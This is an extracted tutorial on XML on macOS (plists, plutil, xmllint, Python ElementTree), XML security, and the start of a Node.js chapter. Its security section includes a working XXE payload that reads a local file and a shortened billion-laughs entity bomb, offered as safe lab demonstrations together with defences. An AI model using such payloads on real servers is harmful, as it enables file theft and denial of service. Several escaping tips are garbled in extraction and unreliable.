blocks.text: XML on your Mac

macOS stores settings, app metadata and service definitions as **property lists** (plists): `~/Library/Preferences/*.plist`, every app's `Contents/Info.plist`, every `launchd` job in `~/Library/LaunchAgents`. A plist is a tree of `<dict>` (alternating `<key>` and value), `<array>`, `<string>`, `<integer>`, `<real>`, `<true/>`, `<false/>`, `<date>` and `<data>` (base64). It can be stored in three encodings that hold the same tree: **XML** (readable), **binary** (`bplist00` magic bytes; what most of the system writes) and, for conversion, **JSON**. [System, Processes & macOS Tools](#system/settings) covers `defaults`, which edits preferences through the plist APIs; here you work on the files.
Create a `launchd` agent definition (the kind you would write to run `netcheck.zsh` every five minutes) in `~/lab/xml`:

blocks.code:
mkdir -p ~/lab/xml && cd ~/lab/xml
cat > netcheck.plist <<'PLIST'
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
	<key>Label</key>
	<string>local.lab.netcheck</string>
	<key>ProgramArguments</key>
	<array>
		<string>/bin/zsh</string>
		<string>/Users/you/bin/netcheck.zsh</string>
	</array>
	<key>RunAtLoad</key>
	<true/>
	<key>StartInterval</key>
	<integer>300</integer>
</dict>
</plist>
PLIST

blocks.text: Then inspect, convert and query it. Nothing here touches your real preferences or loads the job:

blocks.code:
$ plutil -lint netcheck.plist
netcheck.plist: OK
$ plutil -convert binary1 netcheck.plist
$ file netcheck.plist
netcheck.plist: Apple binary property list
$ head -c 8 netcheck.plist; echo
bplist00
$ xmllint --noout netcheck.plist 2>&1 | head -1
netcheck.plist:1: parser error : Start tag expected, '<' not found
$ plutil -p netcheck.plist
{
  "Label" => "local.lab.netcheck"
  "ProgramArguments" => [
    0 => "/bin/zsh"
    1 => "/Users/you/bin/netcheck.zsh"
  ]
  "RunAtLoad" => true
  "StartInterval" => 300
}
$ plutil -convert xml1 -o - netcheck.plist | xmllint --xpath "//key[.='StartInterval']/following-sibling::*[1]/text()" -
300
$ plutil -extract Label raw netcheck.plist
local.lab.netcheck
$ plutil -convert xml1 netcheck.plist && xmllint --xpath '//key/text()' netcheck.plist
Label
ProgramArguments
RunAtLoad
StartInterval

blocks.text: The `plutil` lines are exact for macOS 15 and later: Apple publishes that `plutil` as open source in the `swift-corelibs-foundation` project, and its code fixes the formats shown (`path: OK` for `-lint`; `-p` with `=>`, two-space indents, keys sorted case-insensitively; one value plus a newline for `-extract ... raw`). The `xmllint` lines match the libxml2 2.9.13 that macOS ships (Apple's `libxml2-39` source). Without `2>&1 | head -1`, xmllint also prints the offending line, which here is binary noise, and a `^` under the error position.

The XPath pattern `//key[.='X']/following-sibling::*[1]` is the standard way to read a plist with generic XML tools: plists pair each `<key>` with the **next sibling** element, so "the value of key X" is "the first element after the key whose text is X". `plutil -p` reads binary and XML alike and is meant for humans (its format is not stable for scripts); `plutil -extract key raw` is the script-friendly way to read one value.

`plutil -convert xml1 file.plist` replaces the file with the converted version. Add `-o -` to print to stdout or `-o copy.plist` to write elsewhere, and work on copies of anything under `~/Library` or `/Library`: `cp ~/Library/Preferences/com.apple.dock.plist /tmp/dock.plist` first. JSON has no date or binary-data type, so `plutil -convert json` refuses plists that contain `<date>` or `<data>` values.
On a real system file (read-only, safe; your version will differ):

blocks.code:
$ xmllint --xpath "//key[.='ProductVersion']/following-sibling::string[1]/text()" /System/Library/CoreServices/SystemVersion.plist
27.2
$ plutil -extract CFBundleShortVersionString raw /Applications/Safari.app/Contents/Info.plist
27.2
$ curl -s https://developer.apple.com/news/rss/news.rss | xmllint --xpath '//item/title/text()' - | head -3
Now available: Retention messages for subscriptions
Siri AI is now open to all developers
Get ready with the latest beta releases

blocks.text: The same work in Python

Python's standard library has `xml.etree.ElementTree` for general XML (with a limited XPath subset in `find`/`findall`) and `plistlib` for plists in both encodings. Compare with the JavaScript above; this block runs in the page:

blocks.code:
import xml.etree.ElementTree as ET
xml = """<network name="home" subnet="192.168.1.0/24">
  <device id="1" type="router" online="true"><name>router</name><ip>192.168.1.1</ip><port proto="tcp">80</port><port proto="tcp">443</port></device>
  <device id="3" type="server" online="true"><name>pi</name><ip>192.168.1.50</ip><port proto="tcp">22</port><port proto="tcp">8080</port></device>
  <device id="4" type="storage" online="false"><name>nas</name><ip>192.168.1.60</ip><port proto="tcp">445</port></device>
</network>"""
root = ET.fromstring(xml)
print(root.tag, root.attrib)
for d in root.iter("device"):
    print(d.get("id"), d.findtext("name"), [int(p.text) for p in d.findall("port")])
print([n.text for n in root.findall(".//device[@online='true']/name")])
print(sum(int(p.text) for p in root.iter("port")))
dev = ET.SubElement(root, "device", id="7", type="camera")
ET.SubElement(dev, "name").text = "R&D <cam>"
print(ET.tostring(dev, encoding="unicode"))

blocks.name: plutil -convert xml1
blocks.sum: Convert a property list between binary, XML and JSON encodings, in place or to another file or stdout.
blocks.syntax: plutil -convert xml1|binary1|json [-r] [-o out|-] file    plutil -p file    plutil -extract keypath raw|xml1|json file

how.text: Plists on disk are mostly binary (`bplist00`), which XML tools cannot read. `-convert xml1` rewrites the file as XML; with `-o -` it writes to stdout instead, which is what you want in a pipeline into `xmllint`. `-convert binary1` goes back; `-convert json` (add `-r` for readable JSON) works only when the plist has no `<date>` or `<data>` values.

For reading, `-p` prints any plist for humans, `-extract keypath raw` prints one value (key paths use dots: `ProgramArguments.0`), and `-lint` validates. The general card for `plutil` is in [the system chapter](#system).

blocks.name: xml.etree.ElementTree.fromstring()
blocks.sum: Parse XML text into an Element tree you can iterate, search with a small XPath subset, modify and serialize.
blocks.syntax: ET.fromstring(text) -> Element    ET.parse(path).getroot()    el.find(path) / findall(path) / findtext(path)    el.get(attr)    ET.tostring(el, encoding='unicode')

how.text: `fromstring` parses a string, `parse` a file. An `Element` has `tag`, `attrib` (a dict), `text` and its children, and it is iterable. `iter('name')` walks all descendants with that tag; `find`, `findall` and `findtext` accept a subset of XPath (`.//device[@online='true']/name`, positions, attribute tests, but no functions like `count()`). `SubElement` builds new nodes and `tostring` serializes with escaping, just like the DOM in the browser.
It uses the Expat parser, which does not fetch external entities. For untrusted input the separate `defusedxml` package rejects entity declarations entirely. For plists use `plistlib` instead.

examples.desc: Names of online devices
examples.code:
import xml.etree.ElementTree as ET
root = ET.fromstring("<n><d on='1'><name>pi</name></d><d on='0'><name>nas</name></d></n>")
print([e.text for e in root.findall(".//d[@on='1']/name")])

blocks.text: XML security: XXE and entity expansion
The DTD part of XML can declare **entities**, named replacements that the parser expands. That one feature causes two classic attacks on software that parses XML from someone else.

**XXE (XML External Entity).** An *external* entity's value is a URI, and a parser that resolves it reads that file or URL and pastes the contents into the document. If a server parses uploaded XML that way and echoes any part of it back, an attacker can read files on the server (`file:///etc/passwd`, configuration with database passwords) or make the server request internal URLs (server-side request forgery). Try it safely on your own Mac with a file of your own:

blocks.code:
cd ~/lab/xml
echo 'wifi-psk=correct-horse-battery' > secret.txt
cat > xxe.xml <<'XML'
<?xml version="1.0"?>
<!DOCTYPE note [
  <!ENTITY leak SYSTEM "secret.txt">
]>
<note>&leak;</note>
XML

$ xmllint --xpath 'string(/note)' xxe.xml

$ xmllint --noent --xpath 'string(/note)' xxe.xml
wifi-psk=correct-horse-battery

$ xmllint --noent --nonet --xpath 'string(/note)' xxe.xml
wifi-psk=correct-horse-battery

blocks.text: By default libxml2 leaves the entity unexpanded and the note is empty. `--noent` ("substitute entities") makes it read the file, which is the server-side mistake in miniature. `--nonet` only blocks *network* fetches; local files still leak.
**Billion laughs (entity expansion).** Internal entities can refer to each other. Ten references to an entity that holds ten references, nine levels deep, expand three bytes into about 3 GB:

blocks.code:
<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
  <!-- ... up to lol9: each level multiplies the size by 10 -->
]>
<lolz>&lol3;</lolz>

blocks.text: With three levels as shown it is a harmless 300 characters. Current libxml2 stops the full version with `Maximum entity amplification factor exceeded` and `Detected an entity reference loop`, and Python's bundled Expat has similar limits in recent releases, but older parsers simply run out of memory. Do not test the nine-level version on software you are unsure about.

blocks.title: Rules for parsing XML you did not write

items.text: Browsers are on the safe side: `DOMParser` never loads external entities and caps expansion. The risk is on **servers** and in tools: an upload endpoint, a SOAP service, a SAML login, an office-file importer, a feed fetcher.

Turn off DTD processing and external entities in whatever library you use (OWASP's *XML External Entity Prevention Cheat Sheet* lists the settings for Java, .NET, PHP, Python and others). Never pass `--noent` to `xmllint` or `resolve_entities=True` to `lxml` for untrusted input.

In Python, the standard library's Expat does not fetch external entities, but check `pyexpat.EXPAT_VERSION` (the docs ask for 2.7.2 or later for full expansion protection) and use the `defusedxml` package, which refuses DTD entity declarations outright.
Validate the shape (a schema, or the root-element check you saw above) and escape on output: XML injection is the same class of bug as XSS and SQL injection.

blocks.text: Common mistakes

items.text: **An unescaped `&` or `<`** in text or an attribute: `EntityRef: expecting ';'` or `StartTag: invalid element name`. Write `&` and `<`, or build with DOM methods.
**HTML entities in XML**: ` ` and `©` are undefined. Use ` ` and `©`.
**Anything before the XML declaration**: a blank line, a space, or a debugging `echo` in a script that generates XML. The declaration must come first (only a byte order mark may precede it).
**Assuming `DOMParser` throws**: it returns a document with `<parsererror>`. Check for it every time.
**Forgetting the default namespace in XPath**: `//entry` and `//rect` match nothing in Atom and SVG documents. Use a resolver or `local-name()`.
**`//x[1]` when you meant `(//x)[1]`**: the first is "first child of each parent".
**`createElement('rect')` for SVG**: invisible unknown elements. Use `createElementNS`.
**Building XML with template strings**: one quote or ampersand breaks it, and a crafted value injects elements.
**`plutil -convert` without `-o`**: the original file is rewritten.

**Comparing XML as text**: attribute order, quotes, whitespace and `` versus `` differ without changing the data. Parse both sides and compare trees, or normalize with a canonicalizer (`xmllint --c14n`).

blocks.text: Practice

blocks.title: Render the lab RSS feed

task.text: Fetch `/data/feed.rss`, parse it with `DOMParser`, and for each `<item>` print one line `YYYY-MM-DD title`, using the UTC date from `<pubDate>`. Also append an `li` with the same text to `#feed`, with the item's `<category>` as its class. Use `textContent`, never `innerHTML`, for feed text.

hints: `const doc = new DOMParser().parseFromString(text, 'application/xml');` then `doc.querySelectorAll('item')`.
`new Date(item.querySelector('pubDate').textContent).toISOString().slice(0, 10)` gives `2026-10-05`.

why.text: The feed is parsed once and queried like any DOM. `toISOString()` normalizes RFC 822 dates to UTC so the output does not depend on your time zone. Feed text is untrusted, so it only ever reaches the page through `textContent`.

blocks.title: XPath drills

task.text: The page holds the device inventory in a `<script type="application/xml" id="data">` element (it is not executed, just stored). Set each variable to an XPath expression; the check evaluates them against that document.

items.text: `q1`: the names of all devices (router, pi, nas)
`q2`: the IP address of the device named nas
`q3`: the **number** of online devices
`q4`: the ports greater than 1024
`q5`: the names of devices that have more than one port

task.text: Try your expressions in the xpath widget above first.

hints: `//device/name` for q1. For q2, put a predicate on the device: `//device[name='nas']/ip`.
`count(...)` returns a number; `[. > 1024]` filters ports by value; `[count(port) > 1]` filters devices.

why.text: Each answer is one step plus one predicate: predicates are where XPath does its filtering. `count()` changes the result type from a node set to a number. In q4, the comparison converts each port's text to a number before comparing, which is why `8080 > 1024` works on text content.

blocks.page: The inventory is stored in a script element with id "data".

blocks.title: Break it on purpose: one ampersand

task.text: Run the starter. It prints a parser error instead of the network name and printer name, because the XML contains raw `&` characters. Fix the **XML text** (not the parsing code) so that it prints exactly `R&D lab | Brother & Sons laser`. Read the error message first: it tells you the line and column.

hints: There are two ampersands, one in an attribute value and one in text. Both need escaping.
The entity for `&` is `&`. The parser turns it back into `&`, so the printed output still shows a plain ampersand.

why.text: `&` starts an entity reference, so a parser that meets `&D lab"` looks for a name followed by `;` and stops when it does not find one. Escaping is a property of the *serialized* text only: after parsing, `getAttribute` and `textContent` return the plain characters. The same file fails `xmllint --noout` with `EntityRef: expecting ';'` and a caret under the column.

blocks.check:
assert(!/NOT WELL-FORMED/.test(out), 'The XML still does not parse: escape every & as &.');
assert(out.trim() === 'R&D lab | Brother & Sons laser', 'Expected exactly "R&D lab | Brother & Sons laser"; got ' + JSON.stringify(out.trim()));
blocks.page: Fix the XML string in the code so that it is well-formed.

blocks.title: A plist, converted and queried in Terminal

task.text: In `~/lab/xml`, create `netcheck.plist` as shown in [XML on your Mac](#xml/mac), convert it to **binary**, and confirm with `file` that it is binary. Then, without converting the file back, print only the value of `StartInterval` (300) using `plutil` to produce XML on stdout and `xmllint --xpath` to select the value. Finally print the second program argument with `plutil -extract`.

hints: `plutil -convert xml1 -o - netcheck.plist` writes XML to stdout without touching the file. `xmllint` reads stdin when the file name is `-`.
In a plist the value is the element right after its `<key>`: `//key[.='StartInterval']/following-sibling::*[1]/text()`. Key paths for `-extract` use dots and zero-based indexes: `ProgramArguments.1`.
blocks.solution:
cd ~/lab/xml
plutil -convert binary1 netcheck.plist
file netcheck.plist
plutil -convert xml1 -o - netcheck.plist | xmllint --xpath "//key[.='StartInterval']/following-sibling::*[1]/text()" -
plutil -extract ProgramArguments.1 raw netcheck.plist

why.text: `-o -` turns `plutil` into a converter stage, so binary plists (the format most of macOS writes) become readable by any XML tool without modifying them. The `following-sibling::*[1]` idiom exists because plists pair keys and values by position, not by nesting.

blocks.title: An SVG bar chart from /api/devices

task.text: Fetch `/api/devices`, count the devices of each `type`, and sort the types alphabetically. For the type at index `i` draw a `rect` in `#chart` with `x = i * 50 + 10`, `width = 40`, `height = count * 40` and `y = 120 - height`, plus a `text` label with the type name at `x = i * 50 + 30`, `y = 135`. Print one line per type: `type count`. Create every SVG element with `createElementNS`.

hints: Count with `const counts = {}; for (const d of devices) counts[d.type] = (counts[d.type] ?? 0) + 1;` and sort with `Object.keys(counts).sort()`.
For each attribute call `rect.setAttribute('height', h)`. Use `text.setAttribute('text-anchor', 'middle')` to centre the labels.

why.text: SVG's y axis points down, so a bar of height `h` standing on the line y = 120 starts at `120 - h`. The small `el()` factory hides the namespace and attribute boilerplate; it is the same helper the status-chart playground uses, and the seed of every hand-written chart library.

blocks.page: <svg id="chart" viewBox="0 0 260 140" width="260" height="140" style="background:#f7f9fb; fill:#4c8bf5; font: 9px sans-serif"></svg>

blocks.title: XML, JSON or HTML?

task.text: For each job, pick a format and give one reason: (a) the response of your own new `/api/devices` endpoint consumed by your dashboard's JavaScript; (b) a feed of lab alerts that any feed reader on your phone should be able to subscribe to; (c) a launchd job that runs a script every five minutes; (d) an icon for the dashboard that must look sharp on a Retina display and change colour with the theme; (e) a report a colleague will open and edit in Word.

blocks.solution:
(a) JSON: native to JavaScript (res.json()), compact, typed numbers and booleans.
(b) XML: RSS 2.0 or Atom, because feed readers speak those standards.
(c) XML (plist): launchd reads property lists; write XML, plutil -lint it, macOS may store it as binary.
(d) XML (SVG): vector, scriptable, styleable with CSS classes and currentColor.
(e) XML inside a zip (.docx, Office Open XML): generate it with a library rather than by hand.

why.text: The choice is mostly made by the **consumer**. Where a standard or an existing tool reads the data, speak its format; where you control both ends and the data is records, JSON is simpler. XML wins when the content is a document, when a vocabulary already exists, or when validation and transformation tooling is part of the job.

questions.q: Which of these is well-formed XML?
questions.why: Attribute values must be quoted, names are case-sensitive, elements must nest properly, and `&` must be written `&`. Only the third follows every rule.

questions.q: An XML file contains ` ` and no DTD. What happens when you parse it?

options.text: It becomes a no-break space, as in HTML
It is kept as the literal text " "
The parser reports an undefined entity error

questions.why: XML predefines only `< > & " '`. Write a no-break space as ` `.

questions.q: Which XPath expression returns only the first port element in the whole document?
questions.why: `//port[1]` selects every port that is the first port child of its parent (one per device). The parentheses build the full set first, then take its first member.

questions.q: A feed starts with `<feed xmlns="http://www.w3.org/2005/Atom">`. Why does `//entry` select nothing?

options.text: Atom feeds cannot be queried with XPath
Unprefixed names in XPath 1.0 mean "no namespace", but entry is in the Atom namespace
Browsers only support XPath on HTML documents

questions.why: Bind a prefix through a namespace resolver (`//a:entry`) or match `//*[local-name()='entry']`.

questions.q: Your script calls `document.createElement('circle')`, sets `cx`, `cy` and `r`, and appends it to an `<svg>`. Nothing is drawn. What fixes it?
questions.why: `createElement` makes an HTML element named circle. SVG shapes must be created in the SVG namespace with `document.createElementNS('http://www.w3.org/2000/svg', 'circle')`.

questions.q: What does `plutil -convert xml1 settings.plist` do?

options.text: Prints the plist as XML on stdout
Rewrites settings.plist in place as XML
Validates the plist and prints OK
Creates settings.xml next to the original

questions.why: `-convert` writes back to the input file. Add `-o -` for stdout or `-o other.plist` to write a new file.

blocks.text: **Next:** [Node.js](#node) moves JavaScript to the server: files, streams, an HTTP server from scratch and npm, so the pages you built in these chapters can talk to an API you wrote yourself.

terms.def: Extensible Markup Language: a strict text syntax for trees of named elements, with vocabularies defined on top
Following XML's grammar: one root, closed and nested tags, quoted attributes, escaped & and <
Well-formed and also conforming to a schema (DTD, XML Schema or RELAX NG)
Document Type Definition: the original XML schema language, also able to declare entities
XSD, a W3C schema language written in XML, with data types and patterns
A URI that qualifies element and attribute names so vocabularies can be mixed without collisions
A named escape such as & or < that the parser replaces with characters
A <![CDATA[ ... ]]> block whose text is not scanned for markup
A language for selecting nodes and computing values in an XML or HTML tree; browsers support version 1.0
A template language, written in XML, for transforming XML into XML, HTML or text
Scalable Vector Graphics: an XML vocabulary for 2-D drawings rendered natively by browsers
Apple's plist format for settings and metadata, stored as XML, binary or JSON
XML External Entity attack: a parser that resolves external entities leaks files or makes requests
An entity-expansion attack where nested entities blow a tiny document up to gigabytes

chapters.title: Node.js: JavaScript on the Server
chapters.sub: Run JavaScript outside the browser: scripts in zsh pipelines, files and processes, a web server from scratch, npm, Express and tests
goals: Install a current Node LTS on the Mac and use the REPL, scripts, arguments, environment variables and exit codes
Tell ES modules from CommonJS and fix the errors each one produces
Read and write files, stream a log through a Node script inside a zsh pipeline, and run other programs without shell injection
Build a JSON API on node:http, then rebuild it with Express middleware
Manage packages and scripts with npm, and read semver ranges and the lockfile
Configure a server with .env, answer CORS preflights, debug with --inspect and test with node --test

blocks.text: The JavaScript you wrote in the browser chapters ran inside a page, with a DOM and a sandbox around it. Node.js takes the same language and the same engine, removes the page, and gives you the operating system instead: files, processes, sockets, environment variables, exit codes. In this chapter you will use Node as a scripting tool that sits in zsh pipelines like `awk` does, then build a JSON API twice, first on the bare `node:http` module and then with Express, and finish with the tooling that keeps a server project healthy: npm, `.env` files, CORS, the inspector and the built-in test runner. Every server below was started for real, and every transcript is what `curl` printed.

`mkdir -p ~/lab/node && cd ~/lab/node`, and keep every file from this chapter there. Open the folder in VS Code or PyCharm (since 2026.1 the free PyCharm tier edits JavaScript well; Node.js run configurations and the debugger need the Pro subscription). Keep one Terminal tab for servers and one for `curl`, as in the loopback lab of [Python for networking](#py-net).
What Node is

Node is a program, written mostly in C++, that embeds Google's **V8** JavaScript engine (the one in Chrome) and adds two things a browser engine lacks: an **event loop with asynchronous I/O**, provided by the C library **libuv**, and a **standard library** of modules for files, networking, processes and streams. There is no `window`, no `document`, no DOM. There is `process`, `Buffer`, `require` (in CommonJS files) and a module per subsystem, named with the `node:` prefix.

blocks.code:
your code                         server.js, top.js, Express, npm packages
 ────────────────────────────────────────────────────────────────────────────────
  Node standard library (JS)        ⟪c:node:fs  node:http  node:net  node:stream  node:child_process⟫
 ────────────────────────────────────────────────────────────────────────────────
  bindings (C++)                    turn a JS call into a C/C++ call and back
 ────────────────────────────────────────────────────────────────────────────────
  ⟪y:V8⟫                ⟪g:libuv⟫                         llhttp   OpenSSL   zlib   c-ares
  parses, compiles,   event loop, timers, sockets,    HTTP     TLS       gzip   DNS
  runs JS, GC         thread pool (fs, dns.lookup)    parser
 ────────────────────────────────────────────────────────────────────────────────
  macOS kernel: kqueue, sockets, files, processes

blocks.text: The concurrency model is the one you met in [JavaScript in depth](#js-deeper): **one thread runs your JavaScript**, and everything slow (a socket read, a file read, a timer) is started, handed to the operating system or to libuv's small thread pool (4 threads by default), and finished later by a callback that the event loop runs when the call stack is empty. A Node web server handles thousands of idle connections on one thread because waiting costs nothing. The price is the same as in the browser: a CPU-heavy loop blocks every request until it ends.

blocks.code:
┌──────────────▶ timers        setTimeout / setInterval callbacks that are due
            │                    │
            │                 poll          I/O callbacks: data on a socket, a file read finished
            │                    │          (waits here when there is nothing else to do)
            │                 check         setImmediate callbacks
            │                    │
            └───────────── close           'close' events
     between every callback: process.nextTick queue, then the promise microtask queue

$ node -p 'typeof window + " " + typeof document + " " + typeof process + " " + typeof fetch'
undefined undefined object function
$ node -p 'os.cpus().length + " cpus, " + path.extname("access.log")'

blocks.text: `node -p` evaluates an expression and prints it; `-e` evaluates without printing. In those one-liners, and in the REPL, the core modules (`os`, `path`, `fs`, `http`...) are pre-loaded as globals. In a script file you import them.
Installing Node on your Mac

Up to Node 26, a new major version shipped every six months: **even-numbered** majors became **LTS** (long-term support) in October and got about 30 months of fixes, and odd-numbered ones lived for a few months. From Node 27 the cycle is annual and every major becomes LTS after six months as Current. As of November 2026, according to nodejs.org: Node **26** ("Lithium") became the Active LTS line on 28 October 2026, Node **24** ("Krypton") and Node **22** ("Jod") are in maintenance, and Node 20 is end-of-life. Check nodejs.org for the state on the day you read this, and use an LTS line for anything you want to keep running.

head: Way to install
Command
Good for
rows: one Node for everything; Homebrew's `node` formula tracks the newest release line (26 at the time of writing)
pinning an older line; it is keg-only, so you add its `bin` folder to `PATH` yourself
switching versions per project (`.node-version` or `.nvmrc` files)
install script from the nvm README
the same idea, the most widely documented; slower shell start

blocks.text: With fnm, the three steps are: install it, let it hook into zsh, install the LTS line (26, the Active LTS since October 2026) and make it the default.

blocks.code:
brew install fnm
echo 'eval "$(fnm env --use-on-cd --shell zsh)"' >> ~/.zshrc
source ~/.zshrc
fnm install 26
fnm default 26

blocks.text: With `--use-on-cd`, entering a folder that contains a `.node-version` or `.nvmrc` file switches Node automatically. Whatever you chose, check what you got:

blocks.code:
$ node -v
v22.22.0
$ npm -v
10.9.4
$ which -a node
/opt/homebrew/bin/node

blocks.text: This sample came from a Node 22 machine; with the current LTS you will see v26.x and npm 11 or later. `npm` (the package manager) and `npx` (run a package's command) come with Node.

Homebrew's `node`, fnm and nvm can coexist, and then the first `node` on `PATH` wins, with surprises such as global packages that vanish. `which -a node` lists every `node` zsh sees. Pick one method; if you switch, `brew uninstall node` first.

blocks.name: node
blocks.sum: Run JavaScript files, one-liners or an interactive REPL outside the browser.

how.text: With a file name, Node loads it as the entry module (ES module or CommonJS, see [Modules](#node/modules)), runs its top level, then keeps running while the event loop has work: open servers, pending timers, unfinished reads. When nothing is left, the process exits with `process.exitCode` (0 unless you set it). Everything after the script name lands in `process.argv`, untouched.

blocks.text: The REPL, scripts and the process object

Type `node` and you are in the **REPL** (read, evaluate, print, loop). It prints the value of every expression, keeps `_` as the last result and `_error` as the last exception, supports top-level `await`, and completes names with Tab.

blocks.text: Dot-commands: `.editor` (multi-line mode; finish with [[Ctrl+D]]), `.load file.js`, `.save file.js`, `.break` to escape a half-typed block, `.exit` or [[Ctrl+D]] to leave.
A script is a file. This one prints facts from the global `process` object, which describes the running process:

blocks.code:
$ node hello.js
Node v22.22.0 on darwin/arm64
pid 4127, cwd /Users/you/lab/node
$ chmod +x hello.js && ./hello.js
Node v22.22.0 on darwin/arm64
pid 4131, cwd /Users/you/lab/node

blocks.text: The shebang line `#!/usr/bin/env node` lets the kernel run the file directly once it is executable, exactly as with zsh and Python scripts in [Scripting](#scripting). Node ignores that first line.
Arguments, environment and exit codes

A command-line tool needs four things from its process: arguments, environment variables, a way to report errors, and an exit status. `process.argv` is an array: the path of the `node` binary, the path of the script, then your arguments as strings. `util.parseArgs` turns them into options without a dependency.
The `import` line works because `~/lab/node` will be an ES-module package. Make it one now (the next section explains why):

blocks.code: cd ~/lab/node && npm init -y && npm pkg set type=module

$ node args.js 192.168.1.1 192.168.1.50 -t 500 -v; echo "status $?"
raw: [ '192.168.1.1', '192.168.1.50', '-t', '500', '-v' ]
parsed: [Object: null prototype] { timeout: '500', verbose: true } [ '192.168.1.1', '192.168.1.50' ]
you will probe 192.168.1.1, 192.168.1.50 with a 500 ms timeout
status 0
$ node args.js; echo "status $?"
raw: []
parsed: [Object: null prototype] { timeout: '1000', verbose: false } []
usage: node args.js HOST... [-t ms] [-v]
status 2
$ node args.js --port 80 2>&1 | grep '^TypeError'
TypeError [ERR_PARSE_ARGS_UNKNOWN_OPTION]: Unknown option '--port'. To specify a positional argument starting with a '-', place it at the end of the command after '--', as in '-- "--port"
$ PORT=8080 node -p 'process.env.PORT'
8080

blocks.text: Option values arrive as strings (`'500'`), so convert them. The usage message went to **stderr** with status 2, so `node args.js || echo failed` works in zsh. An unknown option throws, and an uncaught exception prints the stack and exits with status 1. `PORT=8080 node ...` sets a variable for one command, as for any program.

`process.exit(2)` stops the process immediately, even if output written with `process.stdout.write` to a pipe has not been flushed yet. Setting `process.exitCode = 2` and letting the program end naturally always delivers everything. Use `process.exit()` only when you must stop at once.

blocks.name: process.argv
blocks.sum: The command-line arguments of the running process, as an array of strings.

how.text: Element 0 is the absolute path of the `node` binary, element 1 the absolute path of the script, and the rest are the words zsh passed after it, already split and unquoted by the shell. Nothing is parsed: `-t 500` is two strings. Slice off the first two and parse the rest yourself or with `util.parseArgs`.

examples.desc: Destructure the arguments you expect
Pass every host in a file as arguments to one Node process

blocks.name: util.parseArgs()
blocks.sum: Parse short and long options plus positional arguments from process.argv, with no dependency.
blocks.syntax: parseArgs({ options: { name: { type: 'string'|'boolean', short, default, multiple } }, allowPositionals }) → { values, positionals }

how.text: Reads `process.argv.slice(2)` by default (or the `args` array you pass). Accepts `--timeout 500`, `--timeout=500`, `-t 500` and grouped booleans such as `-vq`. Unknown options throw `ERR_PARSE_ARGS_UNKNOWN_OPTION` unless you pass `strict: false`. It does not generate `--help` text; for big tools, a package such as `commander` does.

blocks.name: process.env
blocks.sum: The environment variables of the process, as an object of strings.

how.text: Node copies the environment it was started with into `process.env`. Every value is a string, so `process.env.PORT` is `'8080'`, and a missing variable is `undefined`. This is where configuration belongs (ports, hosts, tokens), because it changes per machine without touching code. Assigning to `process.env` affects only this process and the children it starts.

blocks.name: process.exitCode
blocks.sum: The exit status the process will report to the shell when it ends naturally.

how.text: Zero means success; anything else is failure, exactly as in [Pipes](#pipes/control). Setting `process.exitCode` lets pending output and cleanup finish; `process.exit(code)` ends the process at once. An uncaught exception or an unhandled promise rejection exits with status 1.

blocks.name: process.stdout.write()
blocks.sum: Write text to standard output exactly as given, without the newline and formatting console.log adds.
blocks.syntax: process.stdout.write(string | Buffer) → boolean      console.error(...) writes to stderr

how.text: `process.stdout` is a Writable stream on file descriptor 1. `console.log(x)` formats `x` with `util.inspect` and adds a newline; `write` sends your bytes as they are, which is what you want for machine-readable output such as TSV lines. The return value is `false` when the internal buffer is full: the data is still queued, but a well-behaved producer waits for the `'drain'` event before writing more.

blocks.text: Modules: ES modules and CommonJS

Node has two module systems, and you will meet both. **CommonJS** (CJS) is Node's original: `require()` loads a file synchronously and returns its `module.exports`. **ES modules** (ESM) are the standard from [JavaScript in depth](#js-deeper): `import` and `export`, loaded asynchronously, with top-level `await`, the same syntax the browser runs. New code should be ESM. Old tutorials, many config files and some packages are still CJS.

Node looks up the **nearest** `package.json` above the file. That is why you ran `npm pkg set type=module`: every `.js` file in `~/lab/node` is now an ES module, and a file that must stay CommonJS gets the `.cjs` extension.

blocks.code:
modules.js (ESM entry)
   ├── import isPrivate, { serviceName } from ⟪c:'./lib/netutil.js'⟫   ESM: named + default export
   ├── import legacy from ⟪y:'./legacy.cjs'⟫                         CJS: module.exports becomes the default
   └── import { readFile } from ⟪g:'node:fs/promises'⟫                 built-in, never on disk, never shadowed

$ mkdir -p lib    # then create the three files above
$ node modules.js
ssh unknown
true false
access.log lives in node/
/Users/you/lab/node/modules.js
/Users/you/lab/node
package type: module

blocks.text: Now break it on purpose. Put CommonJS syntax into an ES module and read what Node says:

blocks.code:
$ echo "const fs = require('node:fs');" > oops.js && node oops.js
file:///Users/you/lab/node/oops.js:1
const fs = require('node:fs');
           ^

ReferenceError: require is not defined in ES module scope, you can use import instead
This file is being treated as an ES module because it has a '.js' file extension and '/Users/you/lab/node/package.json' contains "type": "module". To treat it as a CommonJS script, rename it to use the '.cjs' file extension.
$ echo "console.log(__dirname);" > oops.js && node oops.js 2>&1 | grep Error
ReferenceError: __dirname is not defined in ES module scope
$ rm oops.js

blocks.text: The message names both fixes: use `import`, or rename to `.cjs`. In ESM, `__dirname` becomes `import.meta.dirname` (Node 20.11+), and `new URL('./file', import.meta.url)` builds a path relative to the module itself.

Node 22.7 and later detect ESM syntax in a `.js` file even without `"type": "module"`, re-parse it as ESM and run it. If a `package.json` without a `type` field is nearby, they also print `Warning: Module type of file:///... is not specified and it doesn't parse as CommonJS. Reparsing as ES module because module syntax was detected.` The warning is the fix request: add `"type": "module"`. Relying on detection costs a second parse and confuses tools.

Since Node 22.12, a CommonJS file can also `require()` an ES module that has no top-level `await`, which ends most interop pain. The other direction always worked: `import` loads CommonJS, and `module.exports` becomes the default export.

blocks.name: import (Node ESM)
blocks.sum: Load an ES module, a CommonJS module, a built-in or an npm package in an ES-module file.
blocks.syntax: import def, { named } from 'specifier'      const mod = await import('specifier')

how.text: Node resolves the specifier in three ways. `node:fs` is a built-in. `./x.js` or `../lib/x.js` is a file relative to the importing module, and the extension is mandatory (no guessing `index.js` as CommonJS does). A bare name such as `express` is a package looked up in `node_modules` folders, walking up from the importing file. All static imports are resolved and loaded before the module body runs, which is why top-level `await` is allowed. `import()` loads on demand and returns a promise.

examples.desc: Built-in, package and local file
